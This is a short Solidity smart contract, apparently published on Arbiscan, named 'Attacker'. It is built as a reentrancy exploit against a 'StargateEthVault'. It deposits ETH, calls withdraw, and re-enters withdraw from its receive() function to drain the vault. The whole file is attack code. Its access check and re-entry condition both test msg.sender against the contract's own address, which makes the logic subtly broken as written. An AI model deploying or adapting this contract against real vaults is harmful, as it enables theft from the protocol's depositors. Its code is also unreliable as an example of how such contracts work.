/**
 *Submitted for verification at Arbiscan on 2023-08-07
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;

interface StargateEthVault {
    function deposit() external payable;
    function withdraw(uint wad) external;
}

contract Attacker {
    StargateEthVault public vault;

    constructor(address _vault) {
        vault = StargateEthVault(_vault);
    }

    modifier onlyOwner() {
        require(msg.sender == address(this), "Not the owner");
        _;
    }

    function startAttack(uint amount) public onlyOwner {
        vault.deposit{value: amount}();
    }

    function executeAttack(uint amount) public onlyOwner {
        vault.withdraw(amount);
    }

    function withdrawAll() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    receive() external payable {
        if (msg.sender == address(this) && address(vault).balance >= 0.001 ether) {
            vault.withdraw(0.001 ether);
        }
    }
}